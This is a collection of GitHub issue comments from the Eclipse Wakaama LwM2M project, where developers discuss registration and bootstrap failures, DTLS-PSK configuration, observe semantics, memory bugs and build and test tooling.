While the lwm2mclient does. I really hope you can help me because I really need to make it work.
This is what I do:

I start the wakaama server, you told to say how did I start it, in this way:
(from the wakaama directory)
cmake tests/server
make
./lwm2mserver

And about the lightclient:
(from the tests directory, since that from wakaama I've just started the server so I cannot call cmake from there)
cmake lightclient
make
./lightclient

And about the lightclient:
(from the tests directory, since that from wakaama I've just started the server so I cannot call cmake from there)
cmake lightclient
make
./lightclient

As soon as I start the client, the client tells this (and this message is repeated several times every x seconds):
State: STATE_REGISTERING
No Bootstrap Server.
LWM2M Servers:
- Server ID 123    status: REGISTRATION FAILED

At the same time the server says:
New client #0 registered.
Client #0:
    name: ""testlwm2mclient""
    binding: ""UDP""
    lifetime: 300 sec
    objects: /1/0, /3/0, /1024/10, /1024/11, /1024/12,

> 110 bytes received from [::ffff:127.0.0.1]:56830

I really hope you can help me. Furthermore I have another question: what are the characteristic of this lightclient compared to the lwm2mclient (that is the more complete one)?

Just a little curiosity even though it's off topic:
In the client, after telling ""State: STATE_READY"", which looking at the code should mean that the client successfully registered, it says: ""No Bootstrap Server."" That means that it enters in this if: https://github.com/eclipse/wakaama/blob/master/tests/lightclient/lightclient.c#L207

transaction_send() at transaction.c:394
lwm2m_step() at liblwm2m.c
main()

**Analysis:**

If the EP is too long, and lead to the header is longer than COAP_MAX_HEADER_SIZE,  the coap_serialize_multi_option() return 0 and transaction->buffer would be assigned to NULL. 

But the coap_free_header is called and the **transcationP->message is freed partially.**

When re-send,transaction, coap_serialize_message is called again due to the NULL value of transaction->buffer,.................then the program is corrupted.

**Solution**

Remove the transaction if coap_serialize_message is failed

STATE_DIRTY is just for tag server which is modified by bootstrap.  So I remove it and add bool dirty in lwm2m_status_t.

It can pass the server bs process. I'm not sure if it's the best way but it's a simple solution for you reference.

Thanks.

Is it necessary to send endpoint identifier to server?  I don't see this param is required in spec.

I guess server doesn't recognize the update command and treat it as registration command. That's why return error.

Any idea?

I guess you are trying to connect to a server which is neither Leshan or wakaama.
You are right: the Update Registration message does not include the endpoint name. The location is enough to recognize the client.
It looks like your server dropped the client registration before your update message reched it.

as always:
the more information you give about what your doing, the more feedback you will get :-).

Though the answer contains ""text"" (Client must specify an endpoint identifier), I would guess
you don’t use Wakaama as server. So which server do you use? Which version?

There was a change in the LWM2M TS at the beginning of 2015 ( 12. Feb. ) to map
the ""update registration"" not longer to ""PUT"" and use also ""POST"" instead.
So older server implementation may interpret a update with ""POST"" as registration
and therefore report an error.

Mit freundlichen Grüßen / Best regards

I'm using the latest (git from 11.03.) lwm2mclient with a leshan server+bootstrap server. I register/unregister the client several times from the server and also reinitilize the client with bootstrap from time to time.

The error with memtrace enabled:

```
lwm2m_step() failed: 0xA3
[BOOTSTRAP] restore security and server objects
memory: free error (no malloc) /home/david/wakaama/tests/client/object_security.c, 501, free_security_object
memory: already frees at /home/david/wakaama/tests/client/object_security.c, 501, free_security_object
memory: free error (no malloc) /home/david/wakaama/tests/client/object_server.c, 450, free_server_object
memory: already frees at /home/david/wakaama/tests/client/object_server.c, 450, free_server_object
[BOOTSTRAP] ObjectList restored
```

And after looking into the code I actually have problems to understand `void prv_restore_objects(lwm2m_context_t * context)` in **lwm2mclient.c**. You first call `free_security_object(object)` which as last statement calls `lwm2m_free(object)`. So the object pointer is invalid from this point on. After that you call `copy_security_object(object, backup_object)` which tries to do a **memcpy** to this (in my opinion) invalid pointer. Did I overlooked something?

Since tinydtls is sub module of wakaama, do we still need two client demo?

Actually in my local copy I already merge tests/securityclient into tests/client because tests/client has more  features in it.

It's easier for maintain and bug fix.  We may use define dtls feature in tests/client.

- Compared to CUnit no boilerplate code (table of test functions, manually registering those in a main() etc) is necessary.
- Writing a new test case is as easy as adding a file new_test_suite.cpp and adding your test

```
TEST(TestSuiteName, TestName) {
  int a = test_important_func();
  EXPECT_EQ(1, a);
}
```

This of course only works seamlessly, if cmake collects all cpp files via `file(GLOB)` in tests/ and add it to the test binary.
- GTest is C++: A C++ compiler have to be used to compile the tests (and only the tests),
  but you can continue to write tests in C of course.

Look at that beautity. More than 150 lines could be removed.  It is possible to use test fixtures (setup, test cases, teardown) for single test suits and native c++ features like threads would allow you to make complete client<-->server sessions testable. GTest allows to output the result in JUnit and TAP compatible files (thing of jenkins and other CI GUIs). Tests can be repeated and shuffled for detecting memory leaks.

But choosing another test framework is nothing to be rushed. But for mid and longterm it may be a little easier to constribute tests and test suits with something more modern.

At the moment all examples repeat the source list of
- the platform
- tinydtls (if applicable).

I propose to create a cmake file for the platform and and tinydtls each and let those files be included by the example and test projects. That would also be consistent with how the core sources files are listed and included.

If the client has been configured prior to deployment, I'm not sure, why ""lwm2m_configure"" should be called before.

May be the term ""factory bootstrap"" could be interpreted in different ways. But if you want a clarification on that, just use
the OMA issue page (https://github.com/OpenMobileAlliance/OMA-LwM2M-Public-Review/issues).

When calling lwm2m_step(), if you do not have any server information (bootstrap or LWM2M server), the internal state machine will stay in STATE_BOOTSTRAP_REQUIRED and lwm2m_step() will return COAP_503_SERVICE_UNAVAILABLE. 
When factory bootstrap information are available, wakaama will retrieve them from the Security Object lwm2m_object_t.

In your case, it is only a matter of handling the return code of lwm2m_step() accordingly.

The serialization fails and returns -1. But the object_read() function treats the result as a size_t and does not detect the failure, putting a NULL pointer as the payload with a very long length.
Serialization fails because we try to serialize a multiple resource in text format. I'm working on this.

This is the expected behavior: during the bootstrap process, the Bootstrap Server deletes all instances of objects. In the examples client, only the test object implements deletion. Thus the result you observe where the 1024 object has no instances whereas other objects still have theirs.

Currently for single resource request, the client can encode the data using TLV if the CoAP GET message content type is application/vnd.oma.lwm2m+tlv. If there is no content type specified, the client uses plain text by default.
On the server-side, the API does not allow to specify the content-type. I'll rework this part.

which version of leshan you’re using?
Is it a new one, which stores the bootstrap information in json?
If so could you provide the bootstrap json information?

As far as I understood the wakaama log, the client successfully
Started the bootstratp and got two security and one server object(s).
But in the end, it fails to validate the received information.
Therefore it would be easier to understand this, if you can provide
the bootstrap information in a readable format.

Mit freundlichen Grüßen / Best regards

It appears the master branch lwm2mclient example has a bug in its server object. I'm fixing this right now.
Regarding the bootstrap server, it is still of use (at least by me). The master branch is missing a small fix. I'm correcting this also.

Sorry for the inconvenience,
I nee to clean up my too many local branches...

I need to re-work the behavior in case of failed registration update. For now, a failed registration does not impact the state machine. But the behavior should be the same as a failed registration.
The lib user should indeed inspect the context status and each server status to determine what to do when the lwm2m_step() function returns an error.

There was a change in the COAP method for the registration interface in
the LWM2M TS since that (and there are some more changes in the meantime)
The PUT was replaced by POST to confirm with REST behavior.
There are also discussions about that issue on the OMA issue page.

I've implemented wakamaa server in a project. However if the server at the same time on the same objectId and instanceId:
1) request observation on resourceId 1 on client side
2) makes a read on resourceId 2 on client side
3) makes a write to resourceId 3 on client side
then it seems like Wakamaa can't handle 3 requests, i.e it sends back an response from the client on the obervation request, but no response on the others.

Is it necessary to add a queue on a higher level on the server-side, so the client can cope without being choked. But isn't there a queue mechanism already inside of the Wakamaa protocol, or have I misunderstood the implementation?

Is it only me who need to make many requests? Are other people adding sleep(X) seconds between each request, or how are you using this protocol? All ideas/suggestions are welcome.

I just reproduced your experiment with the current wakaama client and server and it worked fine.
In  lwm2mserver.c I added this function:

```
static void prv_stress_client(char * buffer,
                              void * user_data)
{
    lwm2m_context_t * lwm2mH = (lwm2m_context_t *)user_data;
    lwm2m_uri_t uri;
    int result;

    uri.flag = LWM2M_URI_FLAG_OBJECT_ID | LWM2M_URI_FLAG_INSTANCE_ID | LWM2M_URI_FLAG_RESOURCE_ID;
    uri.objectId = 3;
    uri.instanceId = 0;
    uri.resourceId = 0;
    result = lwm2m_observe(lwm2mH, 0, &uri, prv_notify_callback, NULL);

    uri.resourceId = 1;
    result = lwm2m_dm_read(lwm2mH, 0, &uri, prv_result_callback, NULL);

    uri.resourceId = 13;
    result = lwm2m_dm_write(lwm2mH, 0, &uri, LWM2M_CONTENT_TEXT, ""12"", 2, prv_result_callback, NULL);
}
```

And I got the three answers from the client:

```

My mistake, the LWM2M server seems to be doing fine. It seems to be problems on the LWM2M client-side, it seems to crash. As soon as I send 3 requests at same time, client seems to choke. If I send 2 requests at a time, client sometimes work, sometimes crash. If I send 1 request at a time from server to client, then everything seems to be working fine.

Not sure how client is implemented, i.e if it uses Wakamaa, Leishan or something else. I will see if I can find a different client that I can try to connect to and/or create a LWM2M client on my own.

I will close this issue. Once again, thanks for your help.

I've been trying out Wakamaa implementation and found a strange thing that the Xcode compiler warns about (yes, i'm running native-c code inside swift and it works fine).

In core/utils.c there is a function:
`lwm2m_media_type_t utils_convertMediaType(coap_content_type_t type)`
which checks **LWM2M_CONTENT_TLV** and **LWM2M_CONTENT_JSON**, but those two cases are not part of enum **lwm2m_media_type_t**. Why are there printouts? Wouldn't it be better instead to either add those to the enum or remove the two cases?

This function is used to check that the content format of the CoAP payload is handled by the LWM2M stack. In CoAP, the content type is an unsigned 16-bit integer.
coap_content_type_t and  lwm2m_media_type_t enums are actually used as defines. And I did not expend the original coap_content_type_t enum with the new values defined for LWM2M.
This warning is legit but I chose to consider it harmless.
Once the LWM2M content format values are registered with IANA, I will rework this part.

Regards,

I am satisfied with the answer, the warnings are harmless and there are ERROR-printouts in case they occur as well.

So, do you keep track of making this rework somewhere, so I can close this issue, or shall I keep my issue open until you've made the reworked?

Also do you have an idea when IANA will have registered the LWM2M content format? Within a month, 3 months, a year?

sorry to bother again, with a new question. I've run into another question, that maybe someone knows the answer to?

Let's say the LWM2M server tells a LWM2M client that it wants to observe for example /3/0/0. And lets say server then stupidly doesn't keep track of what it is doing and requests an observe on the same value towards the LWM2M client again.

According to code in lwm2m_observe() function in core/observe.c, I can't see that there is a check to NOT observe on the same value again (neither lwm2m_list_newId or LWM2M_LIST_ADD does a check). Is that correct behaviour? What's the reason for being able to add multiple observations on same value? Is it because the observe callback could be to another function? Does anyone know?

Please have a look to observe_handleRequest() in observe.c. The `case 0:` is for observation request.
wakaama starts by creating a lwm2m_watcher_t matching the URI and the server. In your use case, the lwm2m_watcher_t already exists and wakaama overwrites its data (token, time, last value). Thus the previous observation ""disappears"" and wakaama only knows of the new observation.

In Leshan LWM2M client, on a failed update registration, client tries to register, and further failures takes it to bootstrap server.

I understand this is a conscious design decision taken, but this burdens the application developer. From my narrow perspective, any Wakaama user, would like the Leshan route. Is there any class of application developers benefiting from this kind of a decision and would like to know the reasoning behind this decision?

Yes it `select` and not `lwm2m_step()`. Also, I also had a wrong view that _lwm2mclient.c_ in examples was part of library and not a demo implementation. I see it is a demo implementation now.

A query: Assuming we use wakaama with multiple threads - let's say we started a thread for firmware or software download and would like to notify observer on download complete. I understand we need to call `lwm2m_resource_value_changed` on appropriate download or state resource once download is complete. Will this kind of implementation need an immediate call to `lwm2m_step()` after `lwm2m_resource_value_changed` call to  for the observer to be notified ? Currently the `select()` blocks and and notification is sent only after select timeouts and next `lwm2m_step()` is invoked.

The reason for this query came since I was using Leshan where a resource change only needed a simple fireResourceChange([1](https://github.com/eclipse/leshan/blob/leshan-0.1.11-M10/leshan-client-demo/src/main/java/org/eclipse/leshan/client/demo/MyLocation.java#L62)).

Regarding question 1:
1. Building all executables. Deny PRs if failing.
2. Execute tests. Deny PRs if failing.
3. Measure test coverage. Deny if merging the PR would lower the coverage of the target branch.
4. Integrate static code analysis. Deny PR when new defects detected.

I just created PR #489, which does, if and when merged to master, number 1. It also runs the unit tests, but does not (yet) fail when tests fail. Depending on when PR #423 gets merged, I will either create a follow-up PR or update this one.

if this goes in the right direction, I will then move on implementing 3 (SonarCloud and/or Gcov) and 4 (SonarCloud and/or Clang Static Analyzer). Publishing to SonarCloud.io I have [already done](https://github.com/rettichschnidi/wakaama/tree/rettichschnidi-github-ci), integrating it into GitHub to run on PRs seems to be [straight forward](https://www.sonarcloud.io/github), same goes for getting setting up a SonarCloud account. However, fine-tuning the SonarCloud profile likely needs to be done by a committer of this project (or whoever can get the needed permissions over there).","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDcyMTQ2MzkyMQ==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

For simplicity, I commented out all methods except read. This does not affect the behavior of read.

```
        testObj->readFunc = prv_read;
/*
        testObj->writeFunc = prv_write;
        testObj->executeFunc = prv_exec;
        testObj->createFunc = prv_create;
        testObj->deleteFunc = prv_delete;
        testObj->discoverFunc = prv_discover;
*/
```

In `prv_read()`, I try to start with only one resource entry. So I changed the code to

```
if (*numDataP == 0)
    {
        *dataArrayP = lwm2m_data_new(1);
        *numDataP = 1;
        (*dataArrayP)[0].id = 1;
}
```

Then, I try to read the whole instance, say 20100/0, from a Leshan demo serveer.
The server shows 400 error upon this read.
(It seems that the path.getResourceId() is null)

But if I read 20100/0/1, it works as expected.
Defining two entries also works.

```
if (*numDataP == 0)
    {
        *dataArrayP = lwm2m_data_new(2);
        *numDataP = 2;
        (*dataArrayP)[0].id = 1;
        (*dataArrayP)[1].id = 3;
}
```

Could this possibly be a bug? Or did I do something wrong?
Thank you.

I tried to implement a wakaama client and a [lwm2m-node-lib](https://github.com/telefonicaid/lwm2m-node-lib) server.

It seems that the lwm2m-node-lib expects a PUT message on update registration whereas wakaama sends a POST.
The result is a BAD REQUEST from the lwm2m-node-lib server.

I do not know which follows the OMA spec, so actually I post the issue on both projects :D 
The logs are [here](https://github.com/telefonicaid/lwm2m-node-lib/issues/106).

A quick patch can fix this, and it works for lwm2m-node-lib and Leshan servers as well.

I've done every step that is mentioned in the [readme](https://github.com/eclipse/wakaama/tree/master/examples/client) file, but the lwm2mclient in wakaama/example/client folder keeps failing in the registration step.

I've tested it with the online leshan server instance. I have carefully declared a PSK security key with this information : 
- Client endpoint: rpi
- Mode : PSK
- Psk identity: rpi
- Psk secret: 1234

When I execute the program as mentionned below, it fails with a 0xA3 error. So I've pulled out wireshark to see what's going on the network. And all I can see is a single encrypted CoAP packet going out.

Any idea on what the problem is ?

The Client updates its registration.
The Server replies with a 4.04 error.
The Client considers that the registration has failed and that this Server is not available.
The Client having no other Server to register to, it requires a bootstrap.
No bootstrap server is available thus the Client exits.

BTW, this is an exit not a crash.

The registration interface is described in LWM2M TS, 5.3., the mapping to CoAP in 8.2.3.
So, if a “registration update” returns a 4.04 NOT FOUND, then the sever has no “registered device” under that`location`. I would guess 2 main reasons for that: life time expires before a “registration update” could be delivered successful to the lwm2m server, or the lwm2m server is restarted and cleans up his registration (common for test server). So, if you again get a 4.04, look on the leshan clients page. Today the longest registered device is from 8. September. I would guess it’s restarted before.

I join here 2 pcap traces from Wireshark, that i will detail here:
One trace is with a Wakaama server on, the other trace is with a AwaLWM2M server on. The type of server is the only variable here, the different clients are the same on both case.

In the Wakaama Server trace, I execute in order : 

 - Registration and update of a client from mbed, named DEVIT, with a button resource. **FAILED**
- Registration and update of an OMA-DEVKI object, named OMA, with resources. **REGISTRATION OK, UPDATE FAIL**
- Registration and update of a client from mbed, named DEVIT, without any resource. **OK** 
- Registration and update of an AwaLWM2M object, named Awa Client, with resources. **OK**

In the AwaLWM2M Server trace, I execute in order : 

- Registration and update of a client from mbed, named DEVIT, without any resource. **OK** 

 - Registration and update of a client from mbed, named DEVIT, with a button resource. **OK**

- Registration and update of an OMA-DEVKI object, named OMA, with resources. **OK**

- Registration and update of an AwaLWM2M object, named Awa Client, with resources. **OK**

I did not join a third trace with the Leshan Server, the results are the same as with the AWA, everything register and update. The leshan client can register and update on the Wakaama server.

As you can see, the Wakaama server fails multiple times, for different reason ( Don't accept the update, don't accept the ressource etc.), and I can't really explain why.

Regarding the OMA update process with the PUT, I would have thought the OMA-webkit would be up to date.
Regarding the /0 object, my bad, i did that mistake on the trace.

However, I still have follow-up questions regarding the 3 terms URI.
I understand that in the case of known Ipso object, the URI of the ressource is known, and a 2 term URI (object ID & instance number) is sufficient.

But in the case of custom object, such as the test object in the Wakaama server, I don't understand how a 2 term URI is enough.  
The test object is defined as 

> > /*
>  * Implements an object for testing purpose
>  *
>  *  Multiple
>  * Object |  ID  | Instances | Mandatoty |
>  *  Test  | 1024 |    Yes    |    No     |
>  *
>  *  Ressources:
>  *              Supported    Multiple
>  *  Name | ID | Operations | Instances | Mandatory |  Type   | Range | Units | Description |
>  *  test |  1 |    R/W     |    No     |    Yes    | Integer | 0-255 |       |             |
>  *  exec |  2 |     E      |    No     |    Yes    |         |       |       |             |
>  *  dec  |  3 |    R/W     |    No     |    Yes    |  Float  |       |       |             |
>  *
>  */
The 1024 object has therefore 3 resources.
The payload  the client send is  "" /1/0, /2/0, /3/0, /4/0, /5/0, /6/0, /7/0, /1024/10, /1024/11, /1024/12""

I don't see how the second term is supposed to be interpreted as instance of the object in the begining in the payload (e.g /1/0), and as ressource for the test object.
And, as shown in the joined pic, the Leshan M2M server interpret it my way as well, considering the "" /1024/10, /1024/11, /1024/12 "" as one object 1024, with 3 instances and no ressource.

I'm sorry in advance if my question seems trivial, but I have a bit of hard time understanding the subtility
of Wakaama compared to a leshan for example.
Thank you,

10, 11 and 12 are not resources of the wakaama custom object. They are instances. Its resources are 1, 2 and 3.
In LWM2M, the object layout is not given at the registration step. A core concept is that the ID of the Object is well-known by all parties. It is not only the case for IPSO Objects but for all objects.
For custom objects, the server can perform a discover operation to have a rough idea of the object layout but it is not sufficient.

sorry, if this question is obvious, I'm new to Wakaama.

I've added your great Wakaama c-code into an iOS app with swift-code as a LWM2M server. It communicates over BLE with an embedded system, which is LWM2M client, but it uses Leishan instead.

Now I've been asked to add DTLS to iOS app, since embedded system has already added it. When I look in Wakaama documentation and code, the README.md tells me to set switch to DTLS=1 and that works fine and also adding tinyDTLS works fine. However it seems like tinyDTLS is only needed for client side, since compiler flag WITH_TINYDTLS is used in wakaama/examples/client/lwm2mclient.c, but I can't find anything DTLS related in the wakaama/examples/server/lwm2mserver.c. Is DTLS working straight out of the box on server-side? Or what is needed to make it work on server-side?

Data that you would normally directly send to any peer is instead sent to tinyDTLS, where it gets encrypted and is then sent back to your application through callbacks which you register upon connection establishment.

After the DTLS handshake :-).
During the DTLS handshake, the way the credentials are provided for tinyDTLS client or server are different. But it's not too hard. See the bootstrapserver.

I should enforce separated declarations and code, at least for the sake of readability. But I can't see the benefits of being C90-compliant. C90 is 27-years old. Do you really need wakaama to be able to compile with this standard ?
For instance C90 does not allow C++ comments and wakaama is full of them.

Wakaama sends registration update messages 93 secondes earlier to be sure that the message reach the LwM2M Server before it drops the registration. See registration_step() in core/registration.c

I am trying to bootstrap a wakaama client with DTLS. I can run the example client with DTLS-PSK support, and successfully write server and security objects in JSON.

The problem comes when the client registers to a LwM2M server *using* DTLS-PSK, it fails. Example of a security object written to client on bootstrap:

```
{""e"":[{""n"":""0"",""sv"":""coaps://localhost:3002""},{""n"":""1"",""bv"":false},{""n"":""10"",""v"":3},{""n"":""2"",""v"":0},{""n"":""3"",""sv"":""dGVzdGx3bTJtY2xpZW50""},{""n"":""5"",""sv"":""OGY3NmE1ZDA4YzM0NTlmYzRmOTIwMDNlNjBjZmI3ZTk=""}]}
```

Let me know if you need more details, thanks.

*UPDATE: I can confirm now that this is a bug.*

The example client with DTLS enabled works fine on bootstrap (it just unhexifies the PSK from command line).

The drawbacks of what? 
- Apache 2.0 license?
- Changing the `example` DTLS mapping implementation?

The license is in my personal opinion not compatible to the Eclipse License.
Changing the `example` DTLS mapping implementation must simple be done.
I don't know, which approach is faster, asking tinyDTLS to provide a longer PSK secret key or implement a new example mapping for DTLS. But, though my feeling is, that the most have there own opinion about longer secret keys (they simply don't pay off :-) ), it's up to **you** to act, either ask tinyDTLS or implement :-).

I don't think, that using a resource out of their (LWm2M T)specification is a good idea. If you want to change the specification, open an issue on the OMA issue page https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues and we will see, if others agree on that idea and may include it into the LWM2M TS 1.1.

I'm not sure, what should cause the loss of the ""bootstrap-finish"" request. According LWM2M TS 1.0, 
8.2.3, table 23, this is a POST in CON, so it's retransmitted, if the client doesn't ACK it. So the probability of that loss should not be high.

I'm not sure, what you want to achieve with this issue. An explanation of the behaviour? Or an optimization? 

If you want an optimization, how should a device distinguish between a bootstrap where the bootstrap server crashes just before the ""finish bootstrap"" or when bootstrap server crashes still with some more config data to be sent? I think. the device can't ensure, that the bootstrap is finished, except it gets the ""finish bootstrap"" request.

If your Server and your Client are not on the same subnetwork, it is possible that the NAT route was closed by router along the way. To overcome this, you can reduce the lifetime of your registration to 120s. This way the Client will send a Registration Update message every 2 minutes, keeping the route open.

1. Avoid adding the observation to the list in lwm2m_observe if it was found in the list.
2. Modify lwm2m_list_add to avoid adding something to the list that is already there. This would have the benefit of preventing the problem for all lists.
3. Return an error from lwm2m_observe for a duplicate observation instead of processing.

I would suggest both 1 and 2, but wanted to solicit opinions before I create a pull request.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/301/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Most of the time this is due to a NAT equpment along the way closing the UDP mapping.
You cantry using a low lifetime for your Client (like 90 seconds). The Client would send registration messages to the server every minute, keeping the mapping active.

1) Adding the ""Wakaama Test object"" model in Leshan demo. In that case we replace the 1024 ID by a `x-label` one ([26241 - 32768 Range is privately reused and there is no need for registration](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html)).

1. when the lwm2m_step() failed, call the lwm2m_close() and clean up, then restart the lwm2m initiation procedure.

A goal of wakaama is to be as close as possible to the LwM2M standard. Thus this API does not exist.

No need to interpret this.
In Leshan, we just pass it to the user in a map attributes (which contains all the out of the spec attributes), up to him to use it in the way he want to

Some operations like registration may require more time to complete that the timeout specified by the caller.
However, the `STATE_REG_FAILED` state is final, meaning it won't change except if a Bootstrat is performed.
Same for the `STATE_REGISTERED`. The server will keep this state until the lifetime expires (going to `STATE_REG_UPDATE_NEEDED`) or the connection is lost.

I have a few questions:

The Wakaama project split of from Erbium in 2014, has the updates since then mirrored the Erbium updates, or has Wakaama and Erbium ""diverged""?

As I understand it Wakaama implements LWM2M v1.0, that includes CoAP, CoAP-Observe, CoAP-Block-Wise and CoAP-EST. Is this correct?

Appart from changing Client and Server naming conventions to fit LWM2M terminology, are there significant differences between Wakaama and Erbium at this stage? I have looked on the Wakaama code and the most noticeable changes are due to the removal of Contiki-OS dependencies.

[bootstrap_server.ini.log](https://github.com/eclipse/wakaama/files/1684992/bootstrap_server.ini.log)
bootstrap_server.ini is attached.
There is one print added by me.

I have following questions.

1. Is there any support for boot strap server in case of Wakaama.
2. In the github master download page, the examples given does not include any bootstrapping. Do we have dtls support in Client?
3. If the support is there, then let me know what I am missing. Do we require bootstrap(-b option)ing option in client if we are mentioning the identity and pre shared key on command line?
4. Let me know If I am missing anything. I have been given identity and pre shared key for a distant leshan server in some other geographical location. But it also stucks at STATE_BOOSTRAPPING(with -b) or STATE_REGISTERING(without -b).

Thanks,
Amrit Pal Singh.

Leshan is a java implementation.
I have enabled the LWM2M_BOOTSTRAP flag but things dont work.

I also dont know why bootstrapping is required if we mention the psk and identity on command line?

Ideally there will be three programs running, one BS server, One LWM2M server(for normal operations) and one LWM2M client.

if -b option is mentioned on the command line, then LWM2M client should take the psk and Identity parameters from BS server and then use these paramaters to connect with LWM2M server.

I just tried your scenario 1 with current master branch and the bootstrapping went fine (i.e. no COAP_400_BAD_REQUEST error on /0/2).

To answer your questions:
1. Bootstrapping is implemented in the client when building with the LWM2M_BOOTSTRAP define. (e.g. examples/client)
2. DTLS is implemented by the connection layer in functions ```lwm2m_connect_server()```, ```lwm2m_close_connection()``` and ```lwm2m_buffer_send()```. See files examples/shared/dtlsconnection.[c|h]
3. in examples/client/lwm2mclient, the ```-b``` argument means that you want to perform bootstrapping and that the server information provided in the other arguments are for the Bootstrap Server. In your scenario 2, you are connecting to the bootstrap server using DTLS. The example BS does not support DTLS connections.
4. If you are trying to connect to a distant Leshan Server, do not use the -b flag. Your errors are either network errors (the client can not reach the server) or DTLS errors (invalid credentials)

Hope this helps,

Having said that, I want to know the intent and purpose of bootstrapping feature in LWM2M.

I am able to succesfully create an identitiy on leshan.eclipse.org and also connect.

My understanding was that If I use client inititiated bootstrapping then ideally I should not have to use the identity and psk, but the http://leshan.eclipse.org/bs/ also has provision for adding psk and identity.

Can anyone help clarify?","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/364/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Thanks.

Can you give me a small demo on what you do?
Actually what exactly is the meaning of bootstrapping?
What added security it adds when we can connect to the server using Ids and psk without bootstrapping?

Which matches https://tools.ietf.org/html/rfc7252#section-12.3 .

However I would think it would be a good time to get a registration number for CBOR included in the standard. Considering that CBOR is being used as a compact alternative to json in industrial sensors. (Due to compact wire size and compact encoder/decoder).

Note that wakaama is an implementation of the Lightweight M2M standard (LwM2M). The specification of this standard can be found on the OMA website at https://www.omaspecworks.org/what-is-oma-specworks/iot/lightweight-m2m-lwm2m/. LwM2M 1.0 defines the usage of several encoding formats: text, TLV and JSON.

Supporting CBOR would not be part of the 1.0 standard. But, spoiler: it would be part of version 1.1 of the standard.

Regards,

I think I understand a bit more about how wakaama deals with mediatypes. I can see now that lwm2m_media_type_t is a subset of coap_content_type_t. Is this for flexibility in handling mediatypes (or adding mediatypes)? That would make sense, as there is this function `lwm2m_media_type_t utils_convertMediaType(coap_content_type_t type)`.

Plus resources content is always defined by the object models anyway. So maybe in practical terms this approach gives lwm2m more flexibility to support their own datatype independently of iana. Is this correct? Or did the designers have a different idea?","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDM4OTE2NTUwNQ==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

First, the IAR compiler we use only supports ISO/IEC 14882:2003 C++, not C++11.

Just adding classes would be less objectionable than full C++. Some features can increase RAM/Flash requirements and slow processing. We're currently targeting an STM32L4 with 128k RAM and 512k flash running at 8MHz. Others may be targeting even smaller systems. Such resource usage is a significant concern.

Having destructors doesn't make C++ immune from memory leaks. If an object is created with new and never deleted it will still leak memory.

Speaking of new and delete, it can make memory management more challenging. Right now we have our own lwm2m_malloc and lwm2m_free that allocate from pools of fixed size buffers to avoid memory fragmentation. Ideally nothing in the system would use dynamic memory but I think we're beyond the level of complexity where that is possible and this is the compromise we've made.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDM5NjY5MTYyMg==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

C++ is not immune to leaks of course. But if an object is part of another object, on destruction the inner objects free their resources. That's where it requires a lot of care with C and some object/memory ownership and lifetime tracking. 

The last memory leak I found was again a duplicated c-string that was not freed on the outer objects destruction.

I'm using a static memory block as well, and I encounter leaks if connection attempts are interrupted in between. At the moment I'm just zeroing the memory block, and reinitialise wakaama. But that's not how it should be.

I have to admit that without c++11's unique pointer and constexpr, it's less elegant to use c++.

Actually we have been working with Wakaama quit a few years. We have our  devices designed with our own lwm2m stack and use the wakaama for server side software to talk with the devices.

To be frankly, we are very opposite to this idea. Sometimes it is  hard to maintain the memory allocation/free, but with appropriate design pattern and tools like valgrind, it can be done. And it has to be done to build a reliable product.

In the current wakaama design, memory freeing is largely triggered by external messages and timers. Some memory issues can't be simply solved by C++ destruction mechanism. Introducing the C++ mechanism will make it even much harder to troubleshoot those touch memory leak issues (like by the complexity of status management). 

The memory free issue in the prv_getParameters() is actually easy to fix. it should should be fixed by diligence, rather than a ""lazy"" solution.

But as soon as dtls is required, the security object is required, which can only be reached by the `lwm2m_context_t`. Why on earth is the second parameter only the ""userData"" instead of the full
wakaama context which contains the userData?

The examples are using a custom struct, where a `lwm2m_context_t` pointer points back to the lwm2m context:
```
typedef struct
{
    lwm2m_object_t * securityObjP;
    lwm2m_object_t * serverObject;
    int sock;
#ifdef WITH_TINYDTLS
    dtls_connection_t * connList;
    lwm2m_context_t * lwm2mH;
#else
    connection_t * connList;
#endif
    int addressFamily;
} client_data_t;
```
The `securityObjP` as well as `serverObject` and also `lwm2mH` would be redundant in a custom struct, if the following proposal is accepted.

Would everybody agree on changing this API to:
```cpp
// Returns a session handle that MUST uniquely identify a peer.
// secObjInstID: ID of the Securty Object instance to open a connection to

The software will try to use obs mechanism if the device support observe, if not supported it will repeat READ from the device.

However we found it very hard to build robust solution with the obs notification callback if we want to handle exceptional situations, such as obs unsupported, obs timeout, device reset etc.

After spending time to look into the source code, it seems the ""count"" can provide some indication about the situation, however it is mixed use with the observe sequence indicator. So we can not be sure if it is the seuqnce number or status inidcator when its is value is ""COAP_202_DELETED"" for instance. Currently our solution is adding a ""first"" flag in the userData structure, we will use it to help checking the meaning of ""count"" parameter. 

Should we add addition parameter in this callback so the meaning won't be mixed?

When the problem happens, the client process was just terminated, and a obs request was sent and eventually timeout.

note: there was already obs on the object when the new request was sent. It was triggered by a protection to ensure the obseration is alway on - the software will send a new obs if no notified data recieved exceed the pmax period.

This mechnism may be questionable, however we don't expect any exception like this. We tried to find out the reason from the stack but no clue on the reason.

